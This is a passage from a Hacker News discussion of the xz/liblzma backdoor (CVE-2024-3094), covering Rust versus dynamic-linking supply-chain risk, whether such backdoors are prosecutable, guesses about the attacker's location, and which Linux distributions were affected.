every package to know which packages to perform an emergency release for. | | --- | --- | --- | | | |  |  | [packetlost](user?id=packetlost) [9 months ago](item?id=39868261)   | [root](#39866655) | [parent](#39867942) | [next](#39868323) [–]  I... don't see your point. Tracking the dependencies a static binary is built with is already a feature for build systems, just maybe not the ones Debian and RH are using now, but I imagine they would if they were shipping static binaries. Rust isn't really the point here, it's the age old static vs dynamic linking argument. Rust (or rather, Cargo) already tracks which version of a dependency a library depends on (or a pattern to resolve one), but it's besides the point. | | --- | --- | --- | | | |  |  | [ok123456](user?id=ok123456) [9 months ago](item?id=39868347)   | [root](#39866655) | [parent](#39868261) | [next](#39868323) [–]  Rust is the issue here because it doesn't give you much of an option. And that option is the wrong one if you need to do an emergency upgrade of a particular library system-wide. | | --- | --- | --- | | | |  |  | [packetlost](user?id=packetlost) [9 months ago](item?id=39868491)   | [root](#39866655) | [parent](#39868347) | [next](#39868323) [–]  It's really not, it's not hard to do a reverse search of [broken lib] <= depends on <= [rust application] and then rebuild everything that matches. You might have to rebuild more, but that's not really *hard* with modern build infrastructure. Not to mention if you have a Rust application that depends on C libraries, it already dynamically links on most platforms. You only need to rebuild if a Rust crate needs to be updated. | | --- | --- | --- | | | |  |  | [steveklabnik](user?id=steveklabnik) [9 months ago](item?id=39868323)   | [root](#39866655) | [parent](#39867942) | [prev](#39868261) | [next](#39867944) [–]  > imagined Cargo already has this information for every project it builds. That other systems do not is their issue, but it’s not a theoretical design. | | --- | --- | --- | | | |  |  | [ok123456](user?id=ok123456) [9 months ago](item?id=39868399)   | [root](#39866655) | [parent](#39868323) | [next](#39867944) [–]  So, I know that librustxz has been compromised. I'm Debian. I must dive into each rust binary I distribute as part of my system and inspect their Cargo.toml files. Then what? Do I fork each one, bump the version, hope it doesn't break everything, and then push an emergency release!??! | | --- | --- | --- | | | |  |  | [steveklabnik](user?id=steveklabnik) [9 months ago](item?id=39868561)   | [root](#39866655) | [parent](#39868399) | [next](#39867944) [–]  > I must dive into each rust binary I distribute as part of my system and inspect their Cargo.toml A few things: 1. It'd be Cargo.lock 2. Debian, in particular, processes Cargo's output here and makes individual debs. So they've taken advantage of this to already know via their regular package manager tooling. 3. You wouldn't dive into and look through these by hand, you'd have it as a first-class concept. "Which packages use this package" *should* be table stakes for a package manager. > Then what? Do I fork each one, bump the version, hope it doesn't break everything, and then push an emergency release!??! The exact same thing you do in this current situation? It depends on what the issue is. Cargo isn't magic. The point is just that "which libraries does the binary depend on" isn't a problem with actual tooling. People already run tools like cargo-vet in CI to catch versions of packages that may have issues they care about. | | --- | --- | --- | | | |  |  | [ok123456](user?id=ok123456) [9 months ago](item?id=39868611)   | [root](#39866655) | [parent](#39868561) | [next](#39867944) [–]  > The exact same thing you do in this current situation? It depends on what the issue is. Cargo isn't magic. False. In the current situation, you just release a new shared library that is used system-wide. | | --- | --- | --- | | | |  |  | [steveklabnik](user?id=steveklabnik) [9 months ago](item?id=39868656)   | [root](#39866655) | [parent](#39868611) | [next](#39867944) [–]  Okay, so the analogous situation here is that you release a new version of the library, and rebuild. Done. | | --- | --- | --- | | | |  |  | [ok123456](user?id=ok123456) [9 months ago](item?id=39868707)   | [root](#39866655) | [parent](#39868656) | [next](#39867944) [–]  Except that's not the case at all with Rust. | | --- | --- | --- | | | |  |  | [packetlost](user?id=packetlost) [9 months ago](item?id=39868733)   | [root](#39866655) | [parent](#39868707) | [next](#39868768) [–]  Except it *is*. The system package maintainers release a new build of the package in question and then you install it. There's not really anything else to do here. There's nothing special about Rust in this context, it would be exactly the same scenario on, for example, Musl libc based distros with any C application. | | --- | --- | --- | | | |  |  | [uecker](user?id=uecker) [9 months ago](item?id=39869960)   | [root](#39866655) | [parent](#39868733) | [next](#39868750) [–]  Fundamentally there is no difference. In practice Rust makes things a lot worse. It encourages the use of dependencies from random (i.e. published with cargo) sources without much quality control. It is really a supply chain disaster to happen. A problem like this would propagate much faster. Here the threat actor had to work hard to get his library updated in distributions and at each step there was a chance that this is detected. Now think about a Rust package automatically pulling in transitively 100s of crates. Sure, a distribution can later figure out what was affected and push upgrades to all the packages. But fundamentally, we should minimize dependencies and we should have quality control at each level (and ideally we should not run code at build time). Cargo goes into the full opposite direction. Rust got this wrong. | | --- | --- | --- | | | |  |  | [pcwalton](user?id=pcwalton) [9 months ago](item?id=39873052)   | [root](#39866655) | [parent](#39869960) | [next](#39876448) [–]  Whether a hypothetical alternate world in which Rust didn't have a package manager or didn't make sharing code easy would be better or worse than the world we live in isn't an interesting question, because in that world nobody would use Rust to begin with. Developers have expected to be able to share code with package managers ever since Perl 5 and CPAN took off. Like it or not, supply chain attacks are things we have to confront and take steps to solve. Telling developers to avoid dependencies just isn't realistic. | | --- | --- | --- | | | |  |  | [packetlost](user?id=packetlost) [9 months ago](item?id=39876448)   | [root](#39866655) | [parent](#39869960) | [prev](#39873052) | [next](#39868750) [–]  > It encourages the use of dependencies from random (i.e. published with cargo) sources without much quality control. It is really a supply chain disaster to happen. Oh I 100% agree with this, but that's not what was being talked about. That being said, I don't think the distribution model is perfect either: it just has a different set of tradeoffs. Not all software has the same risk profile, not all software is a security boundary between a system and the internet. I 100% agree that the sheer number of crates that the average Rust program pulls in is... not good, but it's also *not* the only language/platform that does this (npm, pypi, pick-your-favorite-text-editor, etc.), so soloing out Rust in that context doesn't make sense either, it only makes sense when comparing it to the C/C++ "ecosystem". I'm also somewhat surprised that the conclusion people come to here is that dynamic linking is a solution to the problem at hand or even a strong source of mitigation: it's really, really not. The ability to, at almost any time, swap out what version of a dependency something is running is what allowed this exploit to happen in the first place. The fact that there was dynamic linking *at all* dramatically increased the blast radius of what was effected by this, not decreased it. It only provides a benefit once discovered, and that benefit is mostly in terms of less packages need to be rebuilt and updated by distro maintainers and users. Ultimately, supply-chain security is an incredibly tough problem that is far more nuanced than valueless "dynamic linking is better than static linking" statements can even come close to communicating. > A problem like this would propagate much faster. Here the threat actor had to work hard to get his library updated in distributions and at each step there was a chance that this is detected. It wouldn't though, because programs would have had to have been rebuilt with the backdoored versions. The book keeping would be harder, but the blast radius would have probably been smaller with static linking *except* in the case where the package is meticulously maintained by someone who bumps their dependencies constantly or if the exploit goes unnoticed for a long period of time. That's trouble no matter what. > Now think about a Rust package automatically pulling in transitively 100s of crates. Yup, but it only happens *at build time*. The blast radius has different time-domain properties than with shared libraries. See above. 100s of crates is ridiculous, and IMO the community could (and should) do a lot more to establish which crates are maintained appropriately and are actually being monitored. > Sure, a distribution can later figure out what was affected and push upgrades to all the packages. This is trivial to do with build system automation and a small modicum of effort. It's also what already happens, no? > But fundamentally, we should minimize dependencies and we should have quality control at each level Agreed, the Rust ecosystem has it's own tooling for quality control. Just because it's not maintained by the distro maintainers doesn't mean it's not there. There is a lot of room for improvement though. > (and ideally we should not run code at build time). Cargo goes into the full opposite direction. Rust got this wrong. Hard, hard, hard disagree. Nearly every language requires executing arbitrary code at compile time, yes, even a good chunk of C/C++. A strong and consistent build system is a positive in this regard: it would be much harder to obfuscate an attack like this in a Rust build.rs because there's not multiple stages of abstraction with an arbitrary number of ways to do it. As it stands, part of the reason the xz exploit was even *possible* was because of the disaster that is autotools. I would argue the Rust build story is significantly better than the average C/C++ build story. Look at all the comments here describing the "autotools gunk" that is used to obfuscate what is actually going on. Sure, you could do something similar for Rust, but it would look *weird*, not "huh, I don't understand this, but that's autotools for ya, eh?" To be clear, I agree with you that the state of Rust and it's packaging is not ideal, but I don't think it necessarily made *wrong* decisions, it's just immature as a platform, which is something that can and will be addressed. | | --- | --- | --- | | | |  |  | [ok123456](user?id=ok123456) [9 months ago](item?id=39868750)   | [root](#39866655) | [parent](#39868733) | [prev](#39869960) | [next](#39868768) [–]  And Alpine Linux is largely a mistake. | | --- | --- | --- | | | |  |  | [packetlost](user?id=packetlost) [9 months ago](item?id=39868765)   | [root](#39866655) | [parent](#39868750) | [next](#39868768) [–]  That's not an argument, nor is it productive. Nobody even mentioned Alpine. Go away. | | --- | --- | --- | | | |  |  | [steveklabnik](user?id=steveklabnik) [9 months ago](item?id=39868768)   | [root](#39866655) | [parent](#39868707) | [prev](#39868733) | [next](#39867944) [–]  Ok well have a nice day I guess. | | --- | --- | --- | | | |  |  | [YetAnotherNick](user?id=YetAnotherNick) [9 months ago](item?id=39867944)   | [root](#39866655) | [parent](#39867357) | [prev](#39867687) | [next](#39867714) [–]  I am not completely sure about this exploit, but seems like a binary needed to be modified for the exploit to work[1] which was later picked up by build system. [https://github.com/tukaani-project/xz/commit/6e636819e8f0703...](https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89) | | --- | --- | --- | | | |  |  | [ok123456](user?id=ok123456) [9 months ago](item?id=39868257)   | [root](#39866655) | [parent](#39867944) | [next](#39867714) [–]  The binary was an xz test file that contained a script that patched the c-code. | | --- | --- | --- | | | |  |  | [JanisErdmanis](user?id=JanisErdmanis) [9 months ago](item?id=39867714)   | [root](#39866655) | [parent](#39867357) | [prev](#39867944) | [next](#39867417) [–]  This seems to be an orthogonal issue. Rust could build the same dynamic library with cargo which could then be distributed. The diference is that there would be a single way to build things. | | --- | --- | --- | | | |  |  | [ok123456](user?id=ok123456) [9 months ago](item?id=39867813)   | [root](#39866655) | [parent](#39867714) | [next](#39867417) [–]  Most Rust libraries are not dynamically linked; instead, versions are pinned and included statically during the build process. This is touted as a feature. Only a few projects are built as system-wide libraries that expose a C-compatible abi interface; rsvg comes to mind. | | --- | --- | --- | | | |  |  | [timschmidt](user?id=timschmidt) [9 months ago](item?id=39869006)   | [root](#39866655) | [parent](#39867813) | [next](#39867417) [–]  It's not touted as a feature by any Rust developers I know of. The Rust ABI is merely still stabilizing. See: <https://github.com/rust-lang/rust/pull/105586> | | --- | --- | --- | | | |  |  | [klysm](user?id=klysm) [9 months ago](item?id=39867417)   | [root](#39866655) | [parent](#39866910) | [prev](#39867357) | [next](#39867047) [–]  People are going to be upset with this perspective but I completely agree. The whole autoconf set of tools is a complete disaster. | | --- | --- | --- | | | |  |  | [Lichtso](user?id=Lichtso) [9 months ago](item?id=39867047)   | [root](#39866655) | [parent](#39866910) | [prev](#39867417) | [next](#39870058) [–]  Once somebody actually does this people are gonna complain the same as always: "The sole purpose of your project is to rewrite perfectly fine stuff in Rust for the sake of it" or something along these lines. | | --- | --- | --- | | | |  |  | [msm\_](user?id=msm_) [9 months ago](item?id=39870058)   | [root](#39866655) | [parent](#39866910) | [prev](#39867047) | [next](#39875698) [–]  Is this *really* the lesson here? We are talking about a maintainer here, who had access to signing keys and a full access to the repository. Deb packages which were distributed are also different than the source code. Do you honestly believe that the (arguably awful) autotools syntax is the single root cause of this mess, Rust will save us from everything, and this is what we should take away from this situation? | | --- | --- | --- | | | |  |  | [delfinom](user?id=delfinom) [9 months ago](item?id=39875698)   | [root](#39866655) | [parent](#39866910) | [prev](#39870058) | [next](#39882192) [–]  I call bullshit. The fundamental problem here was a violation of chain of trust. Open source is only about the source being open. But if users are just downloading blobs with prebuilt binaries or even \_pre-generated scripts\_ that aren't in the original source, there is nothing a less-obscure build system will save you from as you are putting your entire security on the chain of trust being maintained. | | --- | --- | --- | | | |  |  | [joshhansen](user?id=joshhansen) [9 months ago](item?id=39882192)   | [parent](#39866655) | [prev](#39866910) | [next](#39866044) [–]  Am I crazy thinking libraries shouldn't be able to provide \_other libraries'\_ symbols without the other libraries' "permission"? What am I missing? | | --- | --- | --- | | | |  |  | [rasengan](user?id=rasengan) [9 months ago](item?id=39866044)   | [prev](#39866655) | [next](#39866510) [–]  > One portion of the backdoor is *solely in the distributed tarballs*. For easier reference, here's a link to debian's import of the tarball, but it is also present in the tarballs for 5.6.0 and 5.6.1: Ubuntu 22.04 version: dpkg -l |grep liblzma ii liblzma5:amd64 5.2.5-2ubuntu1 amd64 XZ-format compression library Whew! | | --- | --- | --- | | | |  |  | [bagels](user?id=bagels) [9 months ago](item?id=39866510)   | [prev](#39866044) | [next](#39869459) [–]  Is this a crime? Has anyone been prosecuted for adding a backdoor like this? | | --- | --- | --- | | | |  |  | [pvg](user?id=pvg) [9 months ago](item?id=39866816)   | [parent](#39866510) | [next](#39869459) [–]  *Has anyone been prosecuted for adding a backdoor* Google up Randal Schwartz. Caution: clickhole. | | --- | --- | --- | | | |  |  | [amiga386](user?id=amiga386) [9 months ago](item?id=39868320)   | [root](#39866510) | [parent](#39866816) | [next](#39868167) [–]  As far as I remember, he added no backdoors. He was a consultant/sysadmin for Intel, and he did 3 things which he thought his employer would support, and was astonished to find that not only did his employer not support, but actively had him prosecuted for doing it. Ouch. 1. He ran a reverse-proxy on two machines so he could check in on them from home. 2. He used the crack program to find weak passwords. 3. He found a weak password, and used it to log into a system, which he copied the /etc/shadow file from to look for additional weak passwords. [https://www.giac.org/paper/gsec/4039/intel-v-randal-l-schwar...](https://www.giac.org/paper/gsec/4039/intel-v-randal-l-schwartz/100935) [https://web.archive.org/web/20160216204357/http://www.lightl...](https://web.archive.org/web/20160216204357/http%3A//www.lightlink.com/spacenka/fors/faqv4i.html) He didn't try and hide his activities, and didn't do anything else untoward, it was literally just these things which most people wouldn't bat an eyelid at. These days, it is completely normal for a company to provide VPNs for their employees, and completely normal to continually scan for unexpected user accounts or weak passwords. But... because he didn't explain this to higher-ups and get their buy-in, they prosecuted him instead of thanking him. | | --- | --- | --- | | | |  |  | [uniformlyrandom](user?id=uniformlyrandom) [9 months ago](item?id=39868632)   | [root](#39866510) | [parent](#39868320) | [next](#39879681) [–]  To be fair, it is perfectly normal for a surgeon to cut people with a sharp knife with their permission while in the hospital. It is kinda sus when they do it at home without consent. | | --- | --- | --- | | | |  |  | [amiga386](user?id=amiga386) [9 months ago](item?id=39876347)   | [root](#39866510) | [parent](#39868632) | [next](#39879681) [–]  I find it useful to compare the reactions of O'Reilly and Intel. Schwartz worked for both (he wrote *Learning Perl* and co-authored *Programming Perl* for O'Reilly and made them plenty of money). He cracked the passwords of both companies without first getting permission. O'Reilly's sysadmin told him off for not getting permission, and told him not to do it again, but used his results to let people with weak passwords know to change them. Intel's sysadmin started collecting a dossier on Schwartz and ultimately Intel pushed for state criminal charges against him. O'Reilly's sysadmin testified in Schwartz's defense that he was an overly eager guy with no nefarious intent. So - kinda-sus or not - Intel could have resolved this with a dressing down, or even termination if they were really unhappy. Intel \_chose\_ to go nuclear, and invoke the Oregon computer crime laws, and demand the state prosecute him. | | --- | --- | --- | | | |  |  | [ycombinatrix](user?id=ycombinatrix) [9 months ago](item?id=39879681)   | [root](#39866510) | [parent](#39868320) | [prev](#39868632) | [next](#39868167) [–]  apparently he did that after leaving the company, which is pretty sus. | | --- | --- | --- | | | |  |  | [bagels](user?id=bagels) [9 months ago](item?id=39868167)   | [root](#39866510) | [parent](#39866816) | [prev](#39868320) | [next](#39869459) [–]  Seems a little different. Based on a quick read, he gained unauthorized access to systems. In this case, backdoor code was offered to and accepted by xz maintainers. | | --- | --- | --- | | | |  |  | [ptx](user?id=ptx) [9 months ago](item?id=39868322)   | [root](#39866510) | [parent](#39868167) | [next](#39868232) [–]  Lots of things are crimes even though they're just offering something to a victim who willingly accepts it, e.g. phishing attacks, fraudulent investment schemes, contaminated food products. | | --- | --- | --- | | | |  |  | [bagels](user?id=bagels) [9 months ago](item?id=39869377)   | [root](#39866510) | [parent](#39868322) | [next](#39868232) [–]  Sure. I'm wondering if there is a specific law that was broken here. It seems to me that it might be beneficial if there were some legal protection against this sort of act. | | --- | --- | --- | | | |  |  | [pvg](user?id=pvg) [9 months ago](item?id=39868232)   | [root](#39866510) | [parent](#39868167) | [prev](#39868322) | [next](#39869459) [–]  *Seems a little different. Based on a quick read* It is a little different but a thing that you might have missed in the quick read is that one of the things he was accused of was installing and using a backdoor. | | --- | --- | --- | | | |  |  | [bagels](user?id=bagels) [9 months ago](item?id=39869362)   | [root](#39866510) | [parent](#39868232) | [next](#39869459) [–]  One involves making unauthorized access, the other does not. | | --- | --- | --- | | | |  |  | [dmarto](user?id=dmarto) [9 months ago](item?id=39869459)   | [prev](#39866510) | [next](#39867973) [–]  Kinda relevant, as I saw few comments about how safer languages are the solution. Here[0] is a very simple example, that shows how easy such supply chain attacks are in Rust; and lets not forget that there was a very large python attack just a few days ago[1]. [0] - <https://github.com/c-skills/rust1> [1] - [https://checkmarx.com/blog/over-170k-users-affected-by-attac...](https://checkmarx.com/blog/over-170k-users-affected-by-attack-using-fake-python-infrastructure/) | | --- | --- | --- | | | |  |  | [mrcus](user?id=mrcus) [9 months ago](item?id=39869884)   | [parent](#39869459) | [next](#39867973) [–]  I am very concerned about Rust. Rust’s “decision” to have a very slim standard library has advantages, but it severely amplifies some other issues. In Go, I have to pull in zero dependencies to make an HTTP request. In Rust, pulling reqwest pulls in at least 30 distinct packages (<https://lib.rs/crates/reqwest>). Date/time, “basic” base64, common hashing or checksums, etc, they all become supply chain vectors. The Rust ecosystem’s collective refusal to land stable major versions is one of the amplifying issues. “Upgrade fatigue” hits me, at least. “Sure, upgrade ring to 0.17” (which is effectively the 16th major version). And because v0.X versions are usually incompatible, it’s not really possible to opt not to upgrade, because it only takes a short while before some other transitive dependency breaks because you are slow to upgrade. I recently spent a while writing my code to support running multiple versions of the `http` library, for example (which, to be fair, did just land version 1.0). My NATS library (<https://lib.rs/crates/async-nats>) is at version 34. My transitive base64 dependency is at version 22 (<https://lib.rs/crates/base64>). This makes it nearly impossible for me to review these libraries and pin them, because if I pin foo@0.41.7, and bar needs foo@0.42.1, I just get both. bar can’t do =>0.41, because the point of the 0.X series is that it is not backwards compatible. It makes this process so time consuming that I expect people will either just stop (as if they did) reviewing their dependencies, or accept that they might have to reinvent everything from URL parsing to constructing http headers or doing CRC checks. Combine this with a build- and compile-time system that allows completely arbitrary code execution, which is routinely just a wrapper for stuff like in the zx attack (look at a lot of the low-level libs you inevitably pull in). Sure, the build scripts and the macro system enables stuff like the amazing sqlx library, but said build and macro code is already so hard to read, it really takes proper wizardry to properly understand. | | --- | --- | --- | | | |  |  | [dmarto](user?id=dmarto) [9 months ago](item?id=39869959)   | [root](#39869459) | [parent](#39869884) | [next](#39883227) [–]  You have perfectly put into words, all my thoughts. I have been thinking about ways to secure myself, as it is exhausting to think about it every time there is an update or some new dependency. After this attack, I think the only sure way is to unplug the computer and go buy goats. The next best thing? Probably ephemeral VMs or some Codespaces/"Cloud Dev Env thingy". (except neither would save me in the xz case) | | --- | --- | --- | | | |  |  | [7373737373](user?id=7373737373) [9 months ago](item?id=39883227)   | [root](#39869459) | [parent](#39869884) | [prev](#39869959) | [next](#39872975) [–]  > In Rust, pulling reqwest pulls in at least 30 distinct packages This would be less of a problem if each dependency (and in turn, their dependencies) were individually sandboxed, and only allowed to access specific inputs/files at runtime in the capability security (<https://en.wikipedia.org/wiki/Capability-based_security>) fashion. This way the attack surface would be hollowed out as much as possible, and exploits limited to the (sub)program output or specific accessible (writable) files. | | --- | --- | --- | | | |  |  | [Brian\_K\_White](user?id=Brian_K_White) [9 months ago](item?id=39872975)   | [root](#39869459) | [parent](#39869884) | [prev](#39883227) | [next](#39867973) [–]  Or you vendor everything. You don't automatically download anything at build or install time, you just update your local source copies when you want to. Which to be clear I know means rarely. It's 1970 all over again! | | --- | --- | --- | | | |  |  | [dmarto](user?id=dmarto) [9 months ago](item?id=39875798)   | [root](#39869459) | [parent](#39872975) | [next](#39873495) [–]  Vendoring is nice, and I usually prefer it, but you don't always have the time or people for it. Vendoring + custom build system (Bazel?) for everything is basically googles approach, if what I have read is correct. Definitely better than everything we have, but the resources for it are not something most can afford. P.S also what mrcus said, if we trust the upstream build process, we may as well trust their binaries. | | --- | --- | --- | | | |  |  | [Brian\_K\_White](user?id=Brian_K_White) [9 months ago](item?id=39886762)   | [root](#39869459) | [parent](#39875798) | [next](#39873495) [–]  That was what the 1970 crack was about. | | --- | --- | --- | | | |  |  | [mrcus](user?id=mrcus) [9 months ago](item?id=39873495)   | [root](#39869459) | [parent](#39872975) | [prev](#39875798) | [next](#39867973) [–]  Yes, but this doesn’t prevent issues like the xz issue, where the code looks fine, but the build scripts alter it. | | --- | --- | --- | | | |  |  | [markus\_zhang](user?id=markus_zhang) [9 months ago](item?id=39867973)   | [prev](#39869459) | [next](#39869350) [–]  Keeps one wonder how many similar backdoors are there in the wild. What is the best way to execute such a move? This is sophisticated enough, but not good enough to stay unnoticed for a long while. If I were a state actor I'd think about at least 6-12 months. | | --- | --- | --- | | | |  |  | [kapouer](user?id=kapouer) [9 months ago](item?id=39869350)   | [prev](#39867973) | [next](#39868377) [–]  Both <https://github.com/tukaani-project> members accounts have been suspended. (to see that, you can list the followers of each account). | | --- | --- | --- | | | |  |  | [oxymoron290](user?id=oxymoron290) [9 months ago](item?id=39868377)   | [prev](#39869350) | [next](#39866297) [–]  Jai Tan's commit history on his github profile suggests he took off for Christmas, new years, and spring break. I smell an American. | | --- | --- | --- | | | |  |  | [rdtsc](user?id=rdtsc) [9 months ago](item?id=39868605)   | [parent](#39868377) | [next](#39868567) [–]  Sometimes you smell an American because someone wanted you to smell an American. Operating on a target region schedule doesn't seem particularly sophisticated, at least compared to the all the efforts put into this exploit. | | --- | --- | --- | | | |  |  | [bloak](user?id=bloak) [9 months ago](item?id=39868567)   | [parent](#39868377) | [prev](#39868605) | [next](#39866297) [–]  Interesting. Is there also a pattern in the times of day? (I don't so much mean the times in commits done by the developer because they can be fake. I'd be more interested in authentic times recorded by GitHub, if any such times are publicly accessible.) Another thing would be to examine everything ever written by the user for linguistic clues. This might point towards particular native languages or a particular variant of English or towards there being several different authors. | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39868808)   | [root](#39868377) | [parent](#39868567) | [next](#39866297) [–]  Someone said commits lined up with Beijing time, but I've not verified that. But that wouldn't count for much, someone employed by anyone could work any hours. | | --- | --- | --- | | | |  |  | [rany\_](user?id=rany_) [9 months ago](item?id=39869631)   | [root](#39868377) | [parent](#39868808) | [next](#39866297) [–]  Also git actually stores the timezone information. You could see it is consistently China time (GMT+8). P.S. could be Taiwanese as China and Taiwan share the same timezone. Below are links to the git mailbox files where you could see the timezone. From 2022: - [https://github.com/tukaani-project/xz/commit/c6977e740008817...](https://github.com/tukaani-project/xz/commit/c6977e7400088177556e8771bcb839eb7d90caa3.patch) - [https://github.com/tukaani-project/xz/commit/7c16e312cb2f40b...](https://github.com/tukaani-project/xz/commit/7c16e312cb2f40b81154c0e5be13a3c6b8da485d.patch) From 2024: - [https://github.com/tukaani-project/xz/commit/af071ef7702debe...](https://github.com/tukaani-project/xz/commit/af071ef7702debef4f1d324616a0137a5001c14c.patch) - [https://github.com/tukaani-project/xz/commit/a4f2e20d8466369...](https://github.com/tukaani-project/xz/commit/a4f2e20d8466369b1bb277c66f75c9e4ba9cc378.patch) | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39930002)   | [root](#39868377) | [parent](#39869631) | [next](#39873397) [–]  That timezone information is provided by whoever created the commits so cannot be trusted to be correct. Considering the chosen alias it's not unexpected that the timezone information was also made to look Chinese. So could be the holiday inactivity. I'd expect multiple layers of country obfuscation as well as conflicting information to confuse you. Or none. Impossible to know for sure. | | --- | --- | --- | | | |  |  | [Perenti](user?id=Perenti) [9 months ago](item?id=39873397)   | [root](#39868377) | [parent](#39869631) | [prev](#39930002) | [next](#39866297) [–]  Maybe it's a Western Australian, or Indonesian, or Thai... GMT+8 covers a lot of places | | --- | --- | --- | | | |  |  | [formerly\_proven](user?id=formerly_proven) [9 months ago](item?id=39866297)   | [prev](#39868377) | [next](#39883544) [–]  Quite ironic: The most recent commit in the git repo is "Simplify SECURITY.md", committed by the same Github account which added the backdoor. [https://github.com/tukaani-project/xz/commit/af071ef7702debe...](https://github.com/tukaani-project/xz/commit/af071ef7702debef4f1d324616a0137a5001c14c) | | --- | --- | --- | | | |  |  | [rany\_](user?id=rany_) [9 months ago](item?id=39868530)   | [parent](#39866297) | [next](#39883544) [–]  It's not ironic, this change is really sinister IMO. They want you to waste more time after you've submitted the security report and maximize the amount of back and forth. Basically the hope is that they'd be able to pester you with requests for more info/details in order to "resolve the issue" which would give them more time to exploit their targets. | | --- | --- | --- | | | |  |  | [bheadmaster](user?id=bheadmaster) [9 months ago](item?id=39883544)   | [prev](#39866297) | [next](#39871360) [–]  This is exactly why I fight the windmills so hard when it comes automatic updates in Linux software. So much damage is caused just by adding a single maintainer to a project - imagine how much power you would have to wield the remote execution systems put in place by naive developers for "automatic updates". All it takes is a single malicious maintainer given access to the new version update of some popular user software, and they have a new botnet of thousands of devices at their disposal. Better yet, after the backdoor installation, they can just release the *real* update and cover their tracks forever. Automatic updates are like running web applications, but without any sandboxing or protection usually implemented by the browser. | | --- | --- | --- | | | |  |  | [byearthithatius](user?id=byearthithatius) [9 months ago](item?id=39871360)   | [prev](#39883544) | [next](#39866163) [–]  I hope mainstream news cover this so the general population can understand the issue with our software ecoysystems reliance on unpaid open-source maintainers | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39930009)   | [parent](#39871360) | [next](#39866163) [–]  I worry the mainstream news take would just be "open source bad, microsoft closed source and google cloud good" | | --- | --- | --- | | | |  |  | [AdmiralAsshat](user?id=AdmiralAsshat) [9 months ago](item?id=39866163)   | [prev](#39871360) | [next](#39866482) [–]  > Red Hat assigned this issue CVE-2024-3094. Does that mean this affects RHEL and Fedora? | | --- | --- | --- | | | |  |  | [formerly\_proven](user?id=formerly_proven) [9 months ago](item?id=39866241)   | [parent](#39866163) | [next](#39867112) [–]  RHEL no, Fedora 41 and Rawhide yes. [https://www.redhat.com/en/blog/urgent-security-alert-fedora-...](https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users) [https://lists.debian.org/debian-security-announce/2024/msg00...](https://lists.debian.org/debian-security-announce/2024/msg00057.html) | | --- | --- | --- | | | |  |  | [dralley](user?id=dralley) [9 months ago](item?id=39867672)   | [root](#39866163) | [parent](#39866241) | [next](#39867112) [–]  Note that Fedora *40* isn't even released yet, it's in beta, Fedora 41 / rawhide is basically a development branch used only by a small number of people. | | --- | --- | --- | | | |  |  | [dTP90pN](user?id=dTP90pN) [9 months ago](item?id=39874218)   | [root](#39866163) | [parent](#39867672) | [next](#39867112) [–]  A small number of people with likely professional involvement in the Fedora project and possibly RHEL. A supply chain attack serve as the basis for another supply chain attack. | | --- | --- | --- | | | |  |  | [jethro\_tell](user?id=jethro_tell) [9 months ago](item?id=39867112)   | [parent](#39866163) | [prev](#39866241) | [next](#39869797) [–]  RHEL won't get this bug for 2 years =) | | --- | --- | --- | | | |  |  | [fargle](user?id=fargle) [9 months ago](item?id=39871067)   | [root](#39866163) | [parent](#39867112) | [next](#39869797) [–]  i *knew* there was an advantage to being 8-10 years out of date at all times... and when they do port finally backport this bug in 2026, they will probably implement the systemd integration with openssl (pbthththt...) via 600 patch files in some nonstandard divergent manner that thwarts the payload anyhow. see? i knew they were super duper secure. | | --- | --- | --- | | | |  |  | [richardwhiuk](user?id=richardwhiuk) [9 months ago](item?id=39869797)   | [parent](#39866163) | [prev](#39867112) | [next](#39866482) [–]  Red Hat helps to do the job of making sure OSS has CVEs so there's common vernacular for the problem. | | --- | --- | --- | | | |  |  | [PedroBatista](user?id=PedroBatista) [9 months ago](item?id=39866482)   | [prev](#39866163) | [next](#39866076) [–]  Given the recent ( not so recent ) attacks/"bugs" I feel there is a need to do more than the already hard task of investigating and detecting attacks but also to bring IRL consequences to these people. My understanding is that right now it's pretty much a name and shame of people who most of the time aren't even real "people" but hostile agents either working for governments or criminal groups ( or both ) Getting punched in the face is actually a necessary human condition for a healthy civilization. | | --- | --- | --- | | | |  |  | [buildbot](user?id=buildbot) [9 months ago](item?id=39866530)   | [parent](#39866482) | [next](#39869230) [–]  In the article it says CISA was notified - that sounds like it's going to be a federal investigation if nothing else. If I was this person, I wouldn't be in the USA (or any US friendly nation) ASAP. | | --- | --- | --- | | | |  |  | [graemep](user?id=graemep) [9 months ago](item?id=39866716)   | [root](#39866482) | [parent](#39866530) | [next](#39867996) [–]  One of Jia Tan's recent contributions is "Speed up CRC32 calculation on LoongArch" I would guess the odds are that this is not someone in the US. | | --- | --- | --- | | | |  |  | [hangonhn](user?id=hangonhn) [9 months ago](item?id=39867884)   | [root](#39866482) | [parent](#39866716) | [next](#39867493) [–]  It's also very possible that the account was compromised and taken over. A two years long con with real useful work is a lot of patience and effort vs. just stealing a weakly protected account. I wonder if MFA shouldn't be a requirement for accounts that contribute to important OSS projects. | | --- | --- | --- | | | |  |  | [dralley](user?id=dralley) [9 months ago](item?id=39868270)   | [root](#39866482) | [parent](#39867884) | [next](#39869364) [–]  >A two years long con with real useful work is a lot of patience and effort vs. just stealing a weakly protected account. The long-con theory seems a bit more plausible at the moment <https://github.com/google/oss-fuzz/pull/10667> | | --- | --- | --- | | | |  |  | [wyldberry](user?id=wyldberry) [9 months ago](item?id=39868598)   | [root](#39866482) | [parent](#39868270) | [next](#39868442) [–]  If you really step back and think about it, this type of behavior is perfectly aligned with any number of well resourced criminal groups and state actors. Two years of contributing in less visible software with the goal of gaining trust and then slowly pushing your broken fix in. To me that's way more plausible than losing control of your account and the person who compromised it then having someone over a long time insert the backdoor that took a long time to develop and then obfuscate it. Likely someone at GH is talking to some government agencies right now about the behavior of the private repos of that user and their associated users. | | --- | --- | --- | | | |  |  | [sonicanatidae](user?id=sonicanatidae) [9 months ago](item?id=39868770)   | [root](#39866482) | [parent](#39868598) | [next](#39868442) [–]  This would be the smarter attack vector, but I've noticed over time that these people are just assholes. They aren't patient. They are in for the smash/grab. I would not be surprised if there was a group using this approach, but I doubt most of them are/would. If they were that dedicated, they'd just have a fucking job, instead of being dicks on the internet for a living. | | --- | --- | --- | | | |  |  | [wyldberry](user?id=wyldberry) [9 months 